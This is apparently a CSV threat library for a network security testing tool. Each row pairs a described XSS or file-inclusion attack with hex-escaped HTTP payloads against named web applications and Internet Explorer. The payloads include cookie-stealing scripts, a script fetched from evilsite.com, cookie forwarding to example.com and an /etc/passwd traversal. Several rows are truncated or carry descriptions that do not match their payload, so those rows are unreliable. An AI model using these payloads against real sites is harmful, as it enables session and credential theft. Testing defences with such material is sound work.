﻿XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿BEAWeblogic_XSS.xml,BEA Weblogic XSS,This threat takes advantage of a Cross-Site Scripting attack on BEA's Weblogic Administration Console.  This can be used for stealing cookies and authentication information.  The BEA Administration Console typically listens on port 8001.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿Confixxpro_XSS.xml,Confixx Pro ftplogin login Variable XSS,"Confixx Pro contains a flaw that allows a remote cross site scripting attack. This flaw exists because the application does not validate the ""login"" variable upon submission to the ftplogin/ script. This could allow a user to create a specially crafted URL that would execute arbitrary code in a user's browser. ConfixxPro  is a web application, and typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿InternetExplorerHistoryXSS.xml,Internet Explorer History XSS Attack,This threat causes a XSS event to occur in the history bar of Internet Explorer.  This allows a user to inject arbitrary commands and steal sensitive user data.  This threat is a client attack that comes from the virtual server.,HTTP,TCP,GET / HTTP/1.0||0D 0A 0D 0A||
InternetExplorerHistoryXSS.xml,Internet Explorer History XSS Attack,This threat causes a XSS event to occur in the history bar of Internet Explorer.  This allows a user to inject arbitrary commands and steal sensitive user data.  This threat is a client attack that comes from the virtual server.,HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Tue, 29 Mar 2005 19||3A ||14||3A ||11 GMT||0D 0A ||Server||3A || Apache/2.0.40 (Red Hat Linux)||0D 0A ||Last-Modified||3A || Tue, 29 Mar 2005 19||3A ||14||3A ||00 GMT||0D 0A ||ETag||3A || ||22 ||47e76-25a-76822e00||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 602||0D 0A ||Connection||3A || close||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A 0D 0A ||<p><font size=||22 ||7||22 ||>RefBack-MyPage</font></p>||0D 0A ||<p><font size=||22 ||6||22 ||><font size=||22 ||2||22 ||><b><i>Created by <a href=||22 ||http||3A ||//clik.to/liudieyu||22 ||>LiuDieYu</a> ||0D 0A ||  at <a href=||22 ||http||3A ||//umbrella.mx.tc||22 ||>UMBRELLA.MX.TC</a> </i></b></font></font></p>||0D 0A ||<SCRIPT>||0D 0A ||VtPage=||22 ||http||3A ||//www.google.com/||22 3B 0D 0A 0D 0A ||w=window.open(||22 ||javascript||3A ||alert('JPU||3A || \\n document.cookie = \\n'+document.cookie)\||3B ||window.opener.Ref=history.back||3B 22 ||,||22 ||_search||22 ||)||3B 0D 0A ||alert(||22 ||wait until the JPU is executed.||22 ||)||3B 0D 0A ||alert(||22 ||[winMain].Ref = \n||22 || + Ref)||3B 0D 0A 0D 0A ||w=window.open(VtPage,||22 ||_search||22 ||)||3B 0D 0A ||alert(||22 ||wait for VtPage||22 ||)||3B 0D 0A ||Ref()||3B 0D 0A ||alert(||22 ||MISSION COMPLETED.||22 ||)||3B 0D 0A 0D 0A 0D 0A 0D 0A 0D 0A ||</SCRIPT>"
﻿InternetExplorerSearchXSS.xml,Internet Explorer XSS Injection Through Searchbar,"This threat attempts to insert Javascript into the search bar, causing code to be executed with full rights of the user.  Can be used to steal user data or run arbitrary programs.  This threat is a client attack that comes from the virtual server.",HTTP,TCP,GET / HTTP/1.0||0D 0A 0D 0A||
InternetExplorerSearchXSS.xml,Internet Explorer XSS Injection Through Searchbar,"This threat attempts to insert Javascript into the search bar, causing code to be executed with full rights of the user.  Can be used to steal user data or run arbitrary programs.  This threat is a client attack that comes from the virtual server.",HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Tue, 29 Mar 2005 18||3A ||51||3A ||35 GMT||0D 0A ||Server||3A || Apache/2.0.40 (Red Hat Linux)||0D 0A ||Last-Modified||3A || Tue, 29 Mar 2005 18||3A ||51||3A ||13 GMT||0D 0A ||ETag||3A || ||22 ||47e76-1d5-25076a40||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 469||0D 0A ||Connection||3A || close||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||<html><head></head>||0A ||<body><p><font size=||22 ||7||22 ||>WsOpenFileJPU-MyPage</font></p>||0A ||<p><font size=||22 ||6||22 ||><font size=||22 ||2||22 ||><b><i>Created by <a href=||22 ||http||3A ||//clik.to/liudieyu||22 ||>LiuDieYu</a> ||0A ||  at <a href=||22 ||http||3A ||//umbrella.mx.tc/||22 ||>UMBRELLA.MX.TC</a> </i></b></font></font></p>||0A ||<script>||0A ||VtUrl=||22 ||http||3A ||//www.google.com/||22 3B 0A ||window.open(VtUrl,||22 ||_search||22 ||)||3B 0A ||alert(||22 ||wait for VtUrl in Ws||22 ||)||3B 0A ||window.open(||22 ||file||3A ||javascript||3A ||alert('document.cookie = '+document.cookie)||22 ||,||22 ||_search||22 ||)||3B 0A ||</script></body></html>"
﻿InternetExplorerSearchXSS2.xml,Internet Explorer Search Bar Injection,This threat causes a XSS event to happen by loading a webpage in the search bar of Internet Explorer.  This allows a malicious web site to steal user sensitive data or cause command execution.  This threat is a client attack that comes from the virtual server.,HTTP,TCP,GET / HTTP/1.0||0D 0A 0D 0A||
InternetExplorerSearchXSS2.xml,Internet Explorer Search Bar Injection,This threat causes a XSS event to happen by loading a webpage in the search bar of Internet Explorer.  This allows a malicious web site to steal user sensitive data or cause command execution.  This threat is a client attack that comes from the virtual server.,HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Tue, 29 Mar 2005 19||3A ||08||3A ||31 GMT||0D 0A ||Server||3A || Apache/2.0.40 (Red Hat Linux)||0D 0A ||Last-Modified||3A || Tue, 29 Mar 2005 18||3A ||51||3A ||13 GMT||0D 0A ||ETag||3A || ||22 ||47e76-1d5-25076a40||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 469||0D 0A ||Connection||3A || close||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||<html><head></head>||0A ||<body><p><font size=||22 ||7||22 ||>WsOpenFileJPU-MyPage</font></p>||0A ||<p><font size=||22 ||6||22 ||><font size=||22 ||2||22 ||><b><i>Created by <a href=||22 ||http||3A ||//clik.to/liudieyu||22 ||>LiuDieYu</a> ||0A ||  at <a href=||22 ||http||3A ||//umbrella.mx.tc/||22 ||>UMBRELLA.MX.TC</a> </i></b></font></font></p>||0A ||<script>||0A ||VtUrl=||22 ||http||3A ||//www.google.com/||22 3B 0A ||window.open(VtUrl,||22 ||_search||22 ||)||3B 0A ||alert(||22 ||wait for VtUrl in Ws||22 ||)||3B 0A ||window.open(||22 ||file||3A ||javascript||3A ||alert('document.cookie = '+document.cookie)||22 ||,||22 ||_search||22 ||)||3B 0A ||</script></body></html>"
﻿UserAgentXSS.xml,Generic User-Agent XSS Attempt,"This attack represents a cross-site scripting attack through the user-agent field of HTTP.  This field is used in logfile analysis and some server side scripting.  By injecting Javascript into this field, code can be executed through the webpage and be used to steal session and login information.",HTTP,TCP,GET / HTTP/1.0||0A ||Referer||3A || http||3A ||//example.com||0A ||User-Agent||3A || Special brand ||22 ||/><Script>alert(&quot||3B ||1mp3r3ctr0x3rs&quot||3B ||)||3B ||</script>||0A 0A 0A||
UserAgentXSS.xml,Generic User-Agent XSS Attempt,"This attack represents a cross-site scripting attack through the user-agent field of HTTP.  This field is used in logfile analysis and some server side scripting.  By injecting Javascript into this field, code can be executed through the webpage and be used to steal session and login information.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿XSS_Server_Injection.xml,XSS HTTP Server Header Reply,"This attack represents a malicious reply from a webserver, by inserting Javascript elements into the Server header of the HTTP reply.  This will make some web crawlers log Dynamic HTML into their HTML reports, which will then be executed with local privileges.  This threat typically would come from webservers listening on port 80.  This threat is a client attack that comes from the virtual server.",HTTP,TCP,GET / HTTP/1.0||0D 0A 0D 0A||
XSS_Server_Injection.xml,XSS HTTP Server Header Reply,"This attack represents a malicious reply from a webserver, by inserting Javascript elements into the Server header of the HTTP reply.  This will make some web crawlers log Dynamic HTML into their HTML reports, which will then be executed with local privileges.  This threat typically would come from webservers listening on port 80.  This threat is a client attack that comes from the virtual server.",HTTP,TCP,"HTTP/1.0 200 OK||0D 0A ||Date||3A || Wed, 20 Apr 2005 20||3A ||50||3A ||27 GMT||0D 0A ||Server||3A || Apache/2.0.40 (Red Hat Linux)                   <script>alert('1mp3rfectp3wns')||3B ||</script>||0D 0A ||Last-Modified||3A || Wed, 20 Apr 2005 20||3A ||49||3A ||14 GMT||0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||<HTML><BODY><A href='http||3A ||//google.com'>TEST</a></Body></html>||0D 0A||"
﻿absolute_xss.xml,Absolute Image Gallery XE Multiple Cross-Site Scripting Vulnerability,"This threat sends a crafted url to take advantage of a flaw in Absolute Image Gallery XE which does not properly
sanitize user-supplied which allows malicious users to execute code on the affected site.
Absolute Image Gallery XE is a web application the typically listens on port 80",HTTP,TCP,GET /gallery.asp?action=viewimage&categoryid=8&text=&imageid=43&box=&shownew='><script>('XSS')</script> HTTP/1.0||0D 0A ||Host||3A || www.example.com||0D 0A ||User-Agent||3A || Msnbot/2.4||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
absolute_xss.xml,Absolute Image Gallery XE Multiple Cross-Site Scripting Vulnerability,"This threat sends a crafted url to take advantage of a flaw in Absolute Image Gallery XE which does not properly
sanitize user-supplied which allows malicious users to execute code on the affected site.
Absolute Image Gallery XE is a web application the typically listens on port 80",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿antvilleXSS.xml,Antville URL XSS injection,"This threat sends a crafted HTTP Request with with a modified URL string containing Javascript pop-up, the script is inserted into the page with no checking.  Antiville is a web application that typically listens on port 80.",HTTP,TCP,GET /project/about/%3Cscript%3Ealert('XSS')||3B ||%3C/script%3E HTTP/1.0||0D 0A 0D 0A||
antvilleXSS.xml,Antville URL XSS injection,"This threat sends a crafted HTTP Request with with a modified URL string containing Javascript pop-up, the script is inserted into the page with no checking.  Antiville is a web application that typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿awstatsXSS.xml,AWStats Referer XSS,"This threat sends a crafted HTTP Request with the referrer field containing a double quote "".  This double quote is escaped in C fashion when displayed on page, allowing an event handle to be created inside of the hyperlink.   This threat will specifically attempt to forward cookie information to example.com.",HTTP,TCP,GET / HTTP/1.0||0A ||Referer||3A || http||3A ||//www.example.com||22 ||onMouseOver='window.location=this.href+document.cookie'||0A 0A 0A||
awstatsXSS.xml,AWStats Referer XSS,"This threat sends a crafted HTTP Request with the referrer field containing a double quote "".  This double quote is escaped in C fashion when displayed on page, allowing an event handle to be created inside of the hyperlink.   This threat will specifically attempt to forward cookie information to example.com.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿b1gbb_xss.xml,B1GBB Visitenkarte.PHP Cross Site Scripting Vulnerability,"This threat recreates a cross site scripting condition in ColdFusion Fusebox. This can allow an attacker to steal session and cookie information. B1GBB is a web application, and will typically listen on port 80.",HTTP,TCP,GET /visitenkarte.php?user=%22%3E%3Cscript%3Ealert(1)||3B ||%3C/script%3E HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
b1gbb_xss.xml,B1GBB Visitenkarte.PHP Cross Site Scripting Vulnerability,"This threat recreates a cross site scripting condition in ColdFusion Fusebox. This can allow an attacker to steal session and cookie information. B1GBB is a web application, and will typically listen on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿babykatie_vsreal_xss.xml,ScriptsEZ Easy Ad-Manager Details.PHP Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains Javascript which is included in the returned page. Easy Ad-Manager is a web application that typically listens on port 80,HTTP,TCP,GET /vscal/index.php?page=showlisting&lid=<SCRIPT%20SRC=evilsite.com//xss.js></SCRIPT> HTTP/1.0||0D 0A ||Host||3A || www.example.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
babykatie_vsreal_xss.xml,ScriptsEZ Easy Ad-Manager Details.PHP Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains Javascript which is included in the returned page. Easy Ad-Manager is a web application that typically listens on port 80,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿blur6ex_xss.xml,Blursoft Blur6ex Cross-site scripting Vulnerability,This threat sends a crafted URL that contains a malicious script which is then executed by the server. Blur6ex is a web application that typically listens on port 80,HTTP,TCP,GET /blur/index.php?shard=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.0||0D 0A ||Host||3A || www.owned.com||0D 0A ||User-Agent||3A || Googlebot/2
blur6ex_xss.xml,Blursoft Blur6ex Cross-site scripting Vulnerability,This threat sends a crafted URL that contains a malicious script which is then executed by the server. Blur6ex is a web application that typically listens on port 80,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿contentnow_xss.xml,ContentNow 1.30 (upload/xss) Cross-site Scripting Vulnerability,This threat sends a crafted URL that contains a malicious script which is then executed by the server. ContentNow is a web application that typically listens on port 80.,HTTP,TCP,GET /cn/upload.php?path=||22 ||><script>alert(||22 ||xss||22 ||)</script> HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
contentnow_xss.xml,ContentNow 1.30 (upload/xss) Cross-site Scripting Vulnerability,This threat sends a crafted URL that contains a malicious script which is then executed by the server. ContentNow is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿contrexx_XSS_injection.xml,Contrexx Cross Site Scripting Attack,"This attack uses a XSS flaw in the Contrexx CMS.  This allows arbitrary injection of Javascript into the viewable page, allowing an attacker to steal session, password, and other personal information from the end user.  Contrexx is a PHP web application, and typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿coppermine_xss.xml,Coppermine <= 1.4.12 Cross Site Scripting ,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Coppermine is a web application that typically listens on port 80.,HTTP,TCP,GET /cpg/mode.php?admin_mode=1&referer=javascript||3A ||alert  HTTP 1.0||0D 0A 0D 0A||
coppermine_xss.xml,Coppermine <= 1.4.12 Cross Site Scripting ,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Coppermine is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿coppermine_xss_b.xml,Coppermine <= 1.4.12 Cross Site Scripting and Local File Inclusion,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Coppermine is a web application that typically listens on port 80.,HTTP,TCP,GET /cpg/viewlog.php?log=../../../../../../../../../etc/passwd%00  HTTP 1.0||0D 0A 0D 0A||
coppermine_xss_b.xml,Coppermine <= 1.4.12 Cross Site Scripting and Local File Inclusion,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Coppermine is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿cubecart_xss.xml,CubeCart Cross-site Scripting Vulnerability,"This threat sends a crafted HTTP Request with with a modified URL string containing Javascript pop-up, the
script is inserted into the page with no checking. CubeCart is a web application that typically listens on
port 80",HTTP,TCP,GET /store/admin/filemanager/preview.php?file=||22 ||><script>alert(document.cookie)</script> HTTP/1.0||0D 0A ||Host||3A || www.example.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
cubecart_xss.xml,CubeCart Cross-site Scripting Vulnerability,"This threat sends a crafted HTTP Request with with a modified URL string containing Javascript pop-up, the
script is inserted into the page with no checking. CubeCart is a web application that typically listens on
port 80",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿drake_cms_xss.xml,Drake CMS UI.DTA.PHP Cross-Site Scripting Vulnerability,"This threat attempts to cause a cross site scripting condition through the UI.DTA.PHP function call. By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details. Drake CMS is  a web application, and typically listens on port 80.",HTTP,TCP,GET /admin/classes/ui.dta.php?desc[][len]=1&desc[][title]=<script>alert(document.cookie)||3B ||</script>admin/classes/ui.dta.php?desc[][len]=1&desc[][title]=<script>alert(document.cookie)||3B ||</script> HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
drake_cms_xss.xml,Drake CMS UI.DTA.PHP Cross-Site Scripting Vulnerability,"This threat attempts to cause a cross site scripting condition through the UI.DTA.PHP function call. By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details. Drake CMS is  a web application, and typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
